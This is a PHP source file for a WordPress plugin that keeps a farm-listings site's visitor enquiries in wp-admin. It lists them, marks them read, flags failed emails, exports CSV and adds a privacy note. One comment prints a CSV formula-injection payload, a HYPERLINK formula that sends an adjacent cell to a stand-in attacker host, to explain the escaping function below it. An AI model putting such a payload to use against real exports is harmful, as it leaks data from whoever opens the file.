<?php
/**
 * The enquiry inbox — every enquiry kept, and readable in wp-admin.
 *
 * WHY THIS EXISTS
 *
 * The enquiry form used to do one thing with a submission: hand it to wp_mail()
 * and forget it. That is fine right up until it isn't, and the ways it isn't are
 * ordinary rather than exotic:
 *
 *   - wp_mail() returns false on a shared host with no SMTP configured, and the
 *     visitor is told it sent.
 *   - It returns TRUE and the message is still binned by the recipient's spam
 *     filter, because it was sent from a domain with no SPF record.
 *   - Somebody deletes the email, or it lands in a shared inbox nobody watches.
 *
 * Enquiries are the only conversion on a listings site. Losing one is losing the
 * entire return on the advert that produced it, and the agency never finds out —
 * there is nothing to find out FROM. So every enquiry is now written to the
 * database first and emailed second, and the record says whether the email
 * actually went.
 *
 * WHAT THIS IS NOT
 *
 * It is not a CRM and it does not try to be. There is no editing, no replying
 * from wp-admin, no pipeline. It is a list you can read, search, sort, mark as
 * dealt with and export — the smallest thing that stops a lead vanishing.
 *
 * A NOTE ON THE POST TYPE
 *
 * Enquiries are a private post type rather than a custom table. A custom table
 * would mean writing a list table, a search, a pagination scheme and an uninstall
 * routine that all already exist and are already tested. It also means the data
 * survives the plugin being deactivated, which for somebody else's sales leads is
 * the only defensible default.
 *
 * @package Acreage_Core
 */

defined( 'ABSPATH' ) || exit;

class Acreage_Core_Enquiries {

	/** @var string The post type holding enquiries. */
	const POST_TYPE = 'acreage_enquiry';

	/** @var string Meta flag: has somebody looked at this one. */
	const READ = '_acreage_enq_read';

	/** @var string Meta flag: did wp_mail() accept it. */
	const SENT = '_acreage_enq_sent';

	public function __construct() {
		add_action( 'init', array( $this, 'register' ), 5 );
		add_action( 'acreage_core_enquiry_sent', array( $this, 'store' ), 10, 2 );

		if ( is_admin() ) {
			add_filter( 'manage_' . self::POST_TYPE . '_posts_columns', array( $this, 'columns' ) );
			add_action( 'manage_' . self::POST_TYPE . '_posts_custom_column', array( $this, 'column' ), 10, 2 );
			add_filter( 'manage_edit-' . self::POST_TYPE . '_sortable_columns', array( $this, 'sortable' ) );
			add_action( 'add_meta_boxes', array( $this, 'meta_box' ) );
			add_action( 'admin_menu', array( $this, 'unread_bubble' ) );
			add_filter( 'post_row_actions', array( $this, 'row_actions' ), 10, 2 );
			add_action( 'admin_init', array( $this, 'handle_mark' ) );
			add_action( 'admin_init', array( $this, 'handle_export' ) );
			add_action( 'admin_notices', array( $this, 'export_button' ) );
			add_filter( 'bulk_actions-edit-' . self::POST_TYPE, array( $this, 'bulk_actions' ) );
			add_filter( 'handle_bulk_actions-edit-' . self::POST_TYPE, array( $this, 'handle_bulk' ), 10, 3 );
		}

		add_action( 'admin_init', array( $this, 'privacy_note' ) );
	}

	/* ------------------------------------------------------------- the type */

	public function register() {
		register_post_type( self::POST_TYPE, array(
			'labels'          => array(
				'name'               => __( 'Enquiries', 'acreage' ),
				'singular_name'      => __( 'Enquiry', 'acreage' ),
				'menu_name'          => __( 'Enquiries', 'acreage' ),
				'all_items'          => __( 'Enquiries', 'acreage' ),
				'edit_item'          => __( 'Enquiry', 'acreage' ),
				'search_items'       => __( 'Search enquiries', 'acreage' ),
				'not_found'          => __( 'No enquiries yet.', 'acreage' ),
				'not_found_in_trash' => __( 'No enquiries in the bin.', 'acreage' ),
			),

			/*
			 * Never public. An enquiry contains somebody's name, email and
			 * telephone number; it must not have a front-end URL, must not
			 * appear in search, and must not be exposed over REST where a
			 * misconfigured permission would hand the lot to anybody who asked.
			 */
			'public'              => false,
			'publicly_queryable'  => false,
			'exclude_from_search' => true,
			'show_in_rest'        => false,
			'has_archive'         => false,
			'rewrite'             => false,

			'show_ui'      => true,
			'show_in_menu' => 'edit.php?post_type=' . Acreage_Core_Post_Types::POST_TYPE,

			// Read-only: nothing about an enquiry is ours to rewrite.
			'supports'     => array( 'title' ),
			'capabilities' => array(
				'create_posts' => 'do_not_allow',
			),
			'map_meta_cap' => true,
		) );
	}

	/* -------------------------------------------------------------- storing */

	/**
	 * Keep a copy of an enquiry.
	 *
	 * Hooked to the action the form already fired, so the send path itself is
	 * untouched — a failure to store can never stop a message being sent.
	 *
	 * @param bool  $sent    Whether wp_mail() accepted it.
	 * @param array $enquiry Sanitised enquiry: name, email, phone, message, listing.
	 */
	public function store( $sent, $enquiry ) {
		$defaults = array(
			'name'      => '',
			'email'     => '',
			'phone'     => '',
			'message'   => '',
			'listing'   => 0,
			'subject'   => '',
			'regarding' => '',
		);
		$enquiry  = wp_parse_args( $enquiry, $defaults );

		$farm = $enquiry['listing'] ? get_the_title( $enquiry['listing'] ) : '';

		/*
		 * The row title is the one thing visible without opening anything, so it
		 * carries whatever names this enquiry: the farm on a listing enquiry, and
		 * on a general one the subject the sender typed, or the dropdown choice.
		 * A list of bare names tells the owner nothing about which to open first.
		 */
		$about = $farm;

		if ( ! $about ) {
			$about = $enquiry['subject'] ? $enquiry['subject'] : $enquiry['regarding'];
		}

		$title = $about
			/* translators: 1: sender name, 2: farm name or subject. */
			? sprintf( __( '%1$s — %2$s', 'acreage' ), $enquiry['name'], $about )
			: $enquiry['name'];

		$id = wp_insert_post( array(
			'post_type'    => self::POST_TYPE,
			'post_title'   => $title ? $title : __( '(no name)', 'acreage' ),
			'post_content' => $enquiry['message'],
			'post_status'  => 'publish',
		), true );

		if ( is_wp_error( $id ) || ! $id ) {
			return;
		}

		update_post_meta( $id, '_acreage_enq_name', $enquiry['name'] );
		update_post_meta( $id, '_acreage_enq_email', $enquiry['email'] );
		update_post_meta( $id, '_acreage_enq_phone', $enquiry['phone'] );
		update_post_meta( $id, '_acreage_enq_listing', (int) $enquiry['listing'] );
		update_post_meta( $id, '_acreage_enq_subject', $enquiry['subject'] );
		update_post_meta( $id, '_acreage_enq_regarding', $enquiry['regarding'] );
		update_post_meta( $id, self::SENT, $sent ? '1' : '0' );
		update_post_meta( $id, self::READ, '0' );
	}

	/** How many enquiries nobody has opened. */
	public static function unread_count() {
		$ids = get_posts( array(
			'post_type'      => self::POST_TYPE,
			'post_status'    => 'publish',
			'posts_per_page' => 100,
			'fields'         => 'ids',
			'meta_query'     => array(  // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_query
				array( 'key' => self::READ, 'value' => '0' ),
			),
		) );

		return count( $ids );
	}

	/* ---------------------------------------------------------------- lists */

	public function columns( $columns ) {
		// Rebuilt rather than merged: the default title column reads "Title",
		// which for an enquiry is meaningless.
		return array(
			'cb'      => isset( $columns['cb'] ) ? $columns['cb'] : '',
			'who'     => __( 'From', 'acreage' ),
			'contact' => __( 'Contact', 'acreage' ),
			'farm'    => __( 'Farm', 'acreage' ),
			'message' => __( 'Message', 'acreage' ),
			'status'  => __( 'Status', 'acreage' ),
			'date'    => __( 'Received', 'acreage' ),
		);
	}

	public function column( $column, $post_id ) {
		switch ( $column ) {
			case 'who':
				$name   = get_post_meta( $post_id, '_acreage_enq_name', true );
				$unread = '0' === get_post_meta( $post_id, self::READ, true );

				printf(
					'<strong><a href="%s">%s%s</a></strong>',
					esc_url( get_edit_post_link( $post_id ) ),
					$unread ? '<span aria-hidden="true">● </span>' : '',
					esc_html( $name ? $name : __( '(no name)', 'acreage' ) )
				);
				break;

			case 'contact':
				$email = get_post_meta( $post_id, '_acreage_enq_email', true );
				$phone = get_post_meta( $post_id, '_acreage_enq_phone', true );

				if ( $email ) {
					printf( '<a href="mailto:%1$s">%1$s</a>', esc_attr( $email ) );
				}
				if ( $phone ) {
					printf( '<br><a href="tel:%1$s">%2$s</a>', esc_attr( preg_replace( '/[^0-9+]/', '', $phone ) ), esc_html( $phone ) );
				}
				break;

			case 'farm':
				$listing = (int) get_post_meta( $post_id, '_acreage_enq_listing', true );

				if ( $listing && get_post( $listing ) ) {
					printf(
						'<a href="%s">%s</a>',
						esc_url( (string) get_edit_post_link( $listing ) ),
						esc_html( get_the_title( $listing ) )
					);
				} else {
					/*
					 * A general enquiry has no farm, but it usually has a
					 * "Regarding" — and "General query" in this column is far
					 * more use when triaging an inbox than a dash.
					 */
					$regarding = get_post_meta( $post_id, '_acreage_enq_regarding', true );

					if ( $regarding ) {
						echo esc_html( $regarding );
					} else {
						echo '<span aria-hidden="true">—</span><span class="screen-reader-text">'
							. esc_html__( 'General enquiry', 'acreage' ) . '</span>';
					}
				}
				break;

			case 'message':
				echo esc_html( wp_trim_words( get_post_field( 'post_content', $post_id ), 14 ) );
				break;

			case 'status':
				$read = '1' === get_post_meta( $post_id, self::READ, true );
				$sent = '1' === get_post_meta( $post_id, self::SENT, true );

				echo $read
					? esc_html__( 'Read', 'acreage' )
					: '<strong>' . esc_html__( 'New', 'acreage' ) . '</strong>';

				/*
				 * The whole reason this inbox exists. A failed send is invisible
				 * to everyone unless it is said out loud, right next to the
				 * enquiry it lost.
				 */
				if ( ! $sent ) {
					echo '<br><span style="color:#B3261E">'
						. esc_html__( 'Email failed — reply by hand', 'acreage' ) . '</span>';
				}
				break;
		}
	}

	public function sortable( $columns ) {
		$columns['who'] = 'title';

		return $columns;
	}

	/* --------------------------------------------------------------- detail */

	public function meta_box() {
		add_meta_box(
			'acreage-enquiry',
			__( 'Enquiry', 'acreage' ),
			array( $this, 'render_meta_box' ),
			self::POST_TYPE,
			'normal',
			'high'
		);
	}

	public function render_meta_box( $post ) {
		$name    = get_post_meta( $post->ID, '_acreage_enq_name', true );
		$email   = get_post_meta( $post->ID, '_acreage_enq_email', true );
		$phone   = get_post_meta( $post->ID, '_acreage_enq_phone', true );
		$listing = (int) get_post_meta( $post->ID, '_acreage_enq_listing', true );
		$sent    = '1' === get_post_meta( $post->ID, self::SENT, true );

		$enq_subject = get_post_meta( $post->ID, '_acreage_enq_subject', true );
		$regarding   = get_post_meta( $post->ID, '_acreage_enq_regarding', true );

		// Opening it is what "read" means, so mark it here rather than making
		// somebody click a second time to say they have seen it.
		if ( '1' !== get_post_meta( $post->ID, self::READ, true ) ) {
			update_post_meta( $post->ID, self::READ, '1' );
		}

		/*
		 * The mailto's subject. Replying "Re: your enquiry" to somebody who
		 * wrote a subject line makes them go and look up what they asked, so
		 * theirs is quoted back when there is no farm to name instead.
		 */
		if ( $listing ) {
			/* translators: %s: farm name. */
			$subject = sprintf( __( 'Re: %s', 'acreage' ), get_the_title( $listing ) );
		} elseif ( $enq_subject ) {
			/* translators: %s: subject the sender typed. */
			$subject = sprintf( __( 'Re: %s', 'acreage' ), $enq_subject );
		} else {
			$subject = __( 'Re: your enquiry', 'acreage' );
		}
		?>
		<?php if ( ! $sent ) : ?>
			<div class="notice notice-error inline"><p>
				<?php esc_html_e( 'The notification email for this enquiry did not send. The enquiry itself is safe — reply to it by hand, and check your site can send mail (an SMTP plugin is the usual fix).', 'acreage' ); ?>
			</p></div>
		<?php endif; ?>

		<table class="form-table" role="presentation">
			<tbody>
				<tr>
					<th scope="row"><?php esc_html_e( 'Name', 'acreage' ); ?></th>
					<td><?php echo esc_html( $name ); ?></td>
				</tr>
				<tr>
					<th scope="row"><?php esc_html_e( 'Email', 'acreage' ); ?></th>
					<td>
						<?php if ( $email ) : ?>
							<a href="mailto:<?php echo esc_attr( $email ); ?>?subject=<?php echo rawurlencode( $subject ); ?>">
								<?php echo esc_html( $email ); ?>
							</a>
						<?php endif; ?>
					</td>
				</tr>
				<tr>
					<th scope="row"><?php esc_html_e( 'Phone', 'acreage' ); ?></th>
					<td><?php echo $phone ? esc_html( $phone ) : '—'; ?></td>
				</tr>
				<tr>
					<th scope="row"><?php esc_html_e( 'Farm', 'acreage' ); ?></th>
					<td>
						<?php if ( $listing && get_post( $listing ) ) : ?>
							<a href="<?php echo esc_url( (string) get_permalink( $listing ) ); ?>">
								<?php echo esc_html( get_the_title( $listing ) ); ?>
							</a>
						<?php else : ?>
							<?php esc_html_e( 'General enquiry — not about a particular farm.', 'acreage' ); ?>
						<?php endif; ?>
					</td>
				</tr>
				<?php // Both only appear on the contact form, so both are hidden unless present. ?>
				<?php if ( $regarding ) : ?>
					<tr>
						<th scope="row"><?php esc_html_e( 'Regarding', 'acreage' ); ?></th>
						<td><?php echo esc_html( $regarding ); ?></td>
					</tr>
				<?php endif; ?>
				<?php if ( $enq_subject ) : ?>
					<tr>
						<th scope="row"><?php esc_html_e( 'Subject', 'acreage' ); ?></th>
						<td><?php echo esc_html( $enq_subject ); ?></td>
					</tr>
				<?php endif; ?>
				<tr>
					<th scope="row"><?php esc_html_e( 'Received', 'acreage' ); ?></th>
					<td><?php echo esc_html( get_the_date( '', $post ) . ' ' . get_the_time( '', $post ) ); ?></td>
				</tr>
				<tr>
					<th scope="row"><?php esc_html_e( 'Message', 'acreage' ); ?></th>
					<td style="white-space:pre-wrap"><?php echo esc_html( $post->post_content ); ?></td>
				</tr>
			</tbody>
		</table>
		<?php
	}

	/* -------------------------------------------------------------- actions */

	public function row_actions( $actions, $post ) {
		if ( self::POST_TYPE !== $post->post_type ) {
			return $actions;
		}

		// Nothing about an enquiry is editable, so "Edit" and "Quick Edit"
		// promise something the screen does not do.
		unset( $actions['inline hide-if-no-js'], $actions['view'] );

		$read = '1' === get_post_meta( $post->ID, self::READ, true );

		$url = wp_nonce_url(
			add_query_arg( array(
				'acreage_enq_mark' => $read ? 'unread' : 'read',
				'enquiry'          => $post->ID,
			), admin_url( 'edit.php?post_type=' . self::POST_TYPE ) ),
			'acreage-enq-mark'
		);

		$actions['acreage_mark'] = sprintf(
			'<a href="%s">%s</a>',
			esc_url( $url ),
			$read ? esc_html__( 'Mark unread', 'acreage' ) : esc_html__( 'Mark read', 'acreage' )
		);

		return $actions;
	}

	public function handle_mark() {
		if ( empty( $_GET['acreage_enq_mark'] ) || empty( $_GET['enquiry'] ) ) {
			return;
		}

		check_admin_referer( 'acreage-enq-mark' );

		$id = absint( $_GET['enquiry'] );

		if ( ! $id || ! current_user_can( 'edit_post', $id ) ) {
			return;
		}

		update_post_meta( $id, self::READ, 'read' === $_GET['acreage_enq_mark'] ? '1' : '0' );

		wp_safe_redirect( admin_url( 'edit.php?post_type=' . self::POST_TYPE ) );
		exit;
	}

	public function bulk_actions( $actions ) {
		$actions['acreage_read']   = __( 'Mark as read', 'acreage' );
		$actions['acreage_unread'] = __( 'Mark as unread', 'acreage' );

		return $actions;
	}

	public function handle_bulk( $redirect, $action, $ids ) {
		if ( 'acreage_read' !== $action && 'acreage_unread' !== $action ) {
			return $redirect;
		}

		foreach ( $ids as $id ) {
			if ( current_user_can( 'edit_post', $id ) ) {
				update_post_meta( $id, self::READ, 'acreage_read' === $action ? '1' : '0' );
			}
		}

		return $redirect;
	}

	/* --------------------------------------------------------------- export */

	public function export_button() {
		$screen = get_current_screen();

		if ( ! $screen || 'edit-' . self::POST_TYPE !== $screen->id ) {
			return;
		}

		$url = wp_nonce_url(
			admin_url( 'edit.php?post_type=' . self::POST_TYPE . '&acreage_enq_export=1' ),
			'acreage-enq-export'
		);

		printf(
			'<p><a class="button" href="%s">%s</a> <span class="description">%s</span></p>',
			esc_url( $url ),
			esc_html__( 'Export all as CSV', 'acreage' ),
			esc_html__( 'Opens in a spreadsheet. Useful for a mail-merge or importing into a CRM.', 'acreage' )
		);
	}

	public function handle_export() {
		if ( empty( $_GET['acreage_enq_export'] ) ) {
			return;
		}

		check_admin_referer( 'acreage-enq-export' );

		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( esc_html__( 'You do not have permission to do that.', 'acreage' ) );
		}

		$rows = get_posts( array(
			'post_type'      => self::POST_TYPE,
			'post_status'    => 'publish',
			'posts_per_page' => -1,
			'orderby'        => 'date',
			'order'          => 'DESC',
		) );

		nocache_headers();
		header( 'Content-Type: text/csv; charset=utf-8' );
		header( 'Content-Disposition: attachment; filename=enquiries.csv' );

		$out = fopen( 'php://output', 'w' );

		fputcsv( $out, array( 'Received', 'Name', 'Email', 'Phone', 'Farm', 'Regarding', 'Subject', 'Message', 'Emailed', 'Read' ) );

		foreach ( $rows as $row ) {
			$listing = (int) get_post_meta( $row->ID, '_acreage_enq_listing', true );

			fputcsv( $out, array_map( array( $this, 'csv_cell' ), array(
				get_the_date( 'Y-m-d H:i', $row ),
				get_post_meta( $row->ID, '_acreage_enq_name', true ),
				get_post_meta( $row->ID, '_acreage_enq_email', true ),
				get_post_meta( $row->ID, '_acreage_enq_phone', true ),
				$listing ? get_the_title( $listing ) : '',
				get_post_meta( $row->ID, '_acreage_enq_regarding', true ),
				get_post_meta( $row->ID, '_acreage_enq_subject', true ),
				$row->post_content,
				'1' === get_post_meta( $row->ID, self::SENT, true ) ? 'yes' : 'no',
				'1' === get_post_meta( $row->ID, self::READ, true ) ? 'yes' : 'no',
			) ) );
		}

		fclose( $out );
		exit;
	}

	/**
	 * One CSV cell, neutralised so a spreadsheet reads it rather than runs it.
	 *
	 * Every interesting column here was typed by an anonymous visitor into the
	 * enquiry form. sanitize_text_field() made those values safe for HTML; it
	 * says nothing about a spreadsheet, which has its own idea of what a cell
	 * beginning "=" means. Excel and LibreOffice both treat =, +, - and @ as
	 * the start of a formula, so a name of
	 *
	 *     =HYPERLINK("http://evil.tld/?x="&A1,"Click")
	 *
	 * is a link that exfiltrates the row beside it, executing on the machine of
	 * the one person guaranteed to open this file: the site owner. Tab and
	 * carriage return get the same treatment because a leading one lets the
	 * trigger character through behind it.
	 *
	 * The fix is the apostrophe, which is how a spreadsheet has always been
	 * told "this is text". It is consumed on open and never becomes part of the
	 * value. The cost is that a phone number written +27 82 441 7118 is stored
	 * with one, since a leading + is exactly what we are guarding against and
	 * there is no way to tell the two apart.
	 *
	 * @param mixed $value Cell value.
	 * @return string
	 */
	private function csv_cell( $value ) {
		$value = (string) $value;

		if ( '' !== $value && strpos( "=+-@\t\r", $value[0] ) !== false ) {
			return "'" . $value;
		}

		return $value;
	}

	/* -------------------------------------------------------------- the menu */

	/**
	 * Put the unread count beside the menu item, the way comments do.
	 *
	 * An inbox nobody remembers to open is not much better than no inbox, and a
	 * number in the sidebar is the one thing that reliably gets somebody to look.
	 */
	public function unread_bubble() {
		global $submenu;

		$parent = 'edit.php?post_type=' . Acreage_Core_Post_Types::POST_TYPE;

		if ( empty( $submenu[ $parent ] ) ) {
			return;
		}

		$count = self::unread_count();

		if ( ! $count ) {
			return;
		}

		foreach ( $submenu[ $parent ] as $index => $item ) {
			if ( isset( $item[2] ) && 'edit.php?post_type=' . self::POST_TYPE === $item[2] ) {
				$submenu[ $parent ][ $index ][0] .= sprintf( // phpcs:ignore WordPress.WP.GlobalVariablesOverride.Prohibited
					' <span class="awaiting-mod"><span class="pending-count">%d</span></span>',
					$count
				);
				break;
			}
		}
	}

	/* ------------------------------------------------------------- privacy */

	/**
	 * Tell the privacy policy generator that this plugin keeps personal data.
	 *
	 * Storing somebody's name, email and telephone number is exactly the thing a
	 * privacy policy has to disclose. WordPress has a place for a plugin to say
	 * so, and a commercial plugin that stores leads and stays quiet about it
	 * leaves its customer non-compliant without ever telling them.
	 */
	public function privacy_note() {
		if ( ! function_exists( 'wp_add_privacy_policy_content' ) ) {
			return;
		}

		wp_add_privacy_policy_content(
			__( 'Acreage Core', 'acreage' ),
			wp_kses_post( wpautop( __( 'When a visitor sends an enquiry through a farm listing or the contact form, this site stores the name, email address, telephone number and message they submitted, together with the farm they were asking about and the date. It is kept so that enquiries are not lost if email delivery fails, and is visible to site administrators under Farms > Enquiries. Enquiries are not shared with anyone else and can be deleted from that screen at any time.', 'acreage' ) ) )
		);
	}
}
